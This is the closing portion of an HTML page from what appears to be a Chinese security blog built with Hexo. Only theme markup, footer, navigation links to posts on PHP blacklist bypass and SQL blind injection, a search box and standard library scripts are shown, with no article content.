aria-hidden="true"></i> 2018-12-27</div><div class="relatedPosts_title">DVWA_CSRF</div></div></a></div></div><div class="clear_both"></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By osword</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script></body></html>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CSRF/">CSRF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/02/20/PHP%E4%B9%8BGET%E4%BC%A0%E5%8F%82%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP之GET传参黑名单绕过</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/02/20/sql%E7%9B%B2%E6%B3%A8-%E9%99%84python%E8%84%9A%E6%9C%AC/">
+                        <span class="hidden-mobile">sql盲注(附python脚本)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "DVWA之Anti CSRF分析利用(python3+Brute Password)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
